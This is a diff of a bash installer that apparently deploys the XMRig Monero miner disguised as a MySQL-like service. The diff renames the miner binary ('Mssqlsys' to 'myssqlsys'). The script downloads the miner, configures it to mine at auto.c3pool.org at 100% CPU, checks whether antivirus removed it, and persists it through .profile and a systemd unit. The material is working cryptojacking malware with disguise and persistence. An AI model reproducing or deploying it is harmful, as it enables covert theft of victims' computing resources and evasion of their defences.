@@ -178,21 +178,21 @@ if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp; then
 fi
 rm /tmp/wkggxmr.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
+echo "[*] Checking if advanced version of $HOME/myssqltcp/myssqlsys works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HOME/myssqltcp/myssqlsys 中的myssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/myssqltcp/config.json
-$HOME/myssqltcp/Mssqlsys --help >/dev/null
+$HOME/myssqltcp/myssqlsys --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/myssqltcp/Mssqlsys ]; then
-    echo "WARNING: Advanced version of $HOME/myssqltcp/Mssqlsys is not functional"
-	echo "警告: 版本 $HOME/myssqltcp/Mssqlsys 无法正常工作"
+  if [ -f $HOME/myssqltcp/myssqlsys ]; then
+    echo "WARNING: Advanced version of $HOME/myssqltcp/myssqlsys is not functional"
+	echo "警告: 版本 $HOME/myssqltcp/myssqlsys 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HOME/myssqltcp/Mssqlsys was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/myssqltcp/Mssqlsys 下的Mssqlsys已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HOME/myssqltcp/myssqlsys was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HOME/myssqltcp/myssqlsys 下的myssqlsys已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero server"
-  echo "[*] 查看最新版本的 Mssqlsys 服务工具"
+  echo "[*] 查看最新版本的 Myssqlsys 服务工具"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
@@ -212,24 +212,24 @@ if (test $? -ne 0); then
   fi
   rm /tmp/wkggxmr.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
+  echo "[*] Checking if stock version of $HOME/myssqltcp/myssqlsys works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HOME/myssqltcp/myssqlsys 中的Myssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/myssqltcp/config.json
-  $HOME/myssqltcp/Mssqlsys --help >/dev/null
+  $HOME/myssqltcp/myssqlsys --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/myssqltcp/Mssqlsys ]; then
-      echo "ERROR: Stock version of $HOME/myssqltcp/Mssqlsys is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/myssqltcp/Mssqlsys 也无法使用"
+    if [ -f $HOME/myssqltcp/myssqlsys ]; then
+      echo "ERROR: Stock version of $HOME/myssqltcp/myssqlsys is not functional too"
+	  echo "发生错误: 该目录中的 $HOME/myssqltcp/myssqlsys 也无法使用"
     else 
-      echo "ERROR: Stock version of $HOME/myssqltcp/Mssqlsys was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/myssqltcp/Mssqlsys 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HOME/myssqltcp/myssqlsys was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HOME/myssqltcp/myssqlsys 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Server $HOME/myssqltcp/Mssqlsys is OK"
-echo "[*] 服务 $HOME/myssqltcp/Mssqlsys 运行正常"
+echo "[*] Server $HOME/myssqltcp/myssqlsys is OK"
+echo "[*] 服务 $HOME/myssqltcp/myssqlsys 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -246,7 +246,7 @@ sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/myssqltcp/c
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqltcp/Mssqlsys.log'",#' $HOME/myssqltcp/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqltcp/myssqlsys.log'",#' $HOME/myssqltcp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
 
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
@@ -258,13 +258,13 @@ echo "[*] Creating $HOME/myssqltcp/Mssqlup.sh script"
 echo "[*] 在该目录下创建 $HOME/myssqltcp/Mssqlup.sh 脚本"
 cat >$HOME/myssqltcp/Mssqlup.sh <<EOL
 #!/bin/bash
-if ! pidof Mssqlsys >/dev/null; then
-  nice $HOME/myssqltcp/Mssqlsys \$*
+if ! pidof myssqlsys >/dev/null; then
+  nice $HOME/myssqltcp/myssqlsys \$*
 else
   echo "Monero server is already running in the background. Refusing to run another one."
-  echo "Run \"killall Mssqlsys\" or \"sudo killall Mssqlsys\" if you want to remove background server first."
+  echo "Run \"killall myssqlsys\" or \"sudo killall myssqlsys\" if you want to remove background server first."
   echo "Mssqlup服务已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台服务，请运行 \"killall Mssqlsys\" 或 \"sudo killall Mssqlsys\"."
+  echo "如果要先删除后台服务，请运行 \"killall myssqlsys\" 或 \"sudo killall myssqlsys\"."
 fi
 EOL
 
@@ -281,8 +281,8 @@ if ! sudo -n true 2>/dev/null; then
     echo "Looks like $HOME/myssqltcp/Mssqlup.sh script is already in the $HOME/.profile"
 	echo "脚本 $HOME/myssqltcp/Mssqlup.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running server in the background (see logs in $HOME/myssqltcp/Mssqlsys.log file)"
-  echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/myssqltcp/Mssqlsys.log 日志文件)"
+  echo "[*] Running server in the background (see logs in $HOME/myssqltcp/myssqlsys.log file)"
+  echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqltcp/myssqlsys.log 日志文件)"
   /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
@@ -295,8 +295,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running server in the background (see logs in $HOME/myssqltcp/Mssqlsys.log file)"
-	echo "[*] 已在后台运行Mssqlsys (请查看 $HOME/myssqltcp/Mssqlsys.log 日志文件)"
+    echo "[*] Running server in the background (see logs in $HOME/myssqltcp/myssqlsys.log file)"
+	echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqltcp/myssqlsys.log 日志文件)"
     /bin/bash $HOME/myssqltcp/Mssqlup.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
@@ -309,7 +309,7 @@ else
 Description=Monero server service
 
 [Service]
-ExecStart=$HOME/myssqltcp/Mssqlsys --config=$HOME/myssqltcp/config.json
+ExecStart=$HOME/myssqltcp/myssqlsys --config=$HOME/myssqltcp/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -320,7 +320,7 @@ EOL
     sudo mv /tmp/Mssqlup_server.service /etc/systemd/system/Mssqlup_server.service
     echo "[*] Starting Mssqlup_server systemd service"
 	echo "[*] 启动Mssqlup_server systemd服务"
-    sudo killall Mssqlsys 2>/dev/null
+    sudo killall myssqlsys 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable Mssqlup_server.service
     sudo systemctl start Mssqlup_server.service
@@ -335,11 +335,11 @@ echo "提示: 如果您使用共享VPS，建议避免由服务产生100％的CPU
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit server to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b"
+  echo "sudo cpulimit -e myssqlsys -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e myssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e Mssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e myssqlsys -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit server to 75% percent CPU usage:"
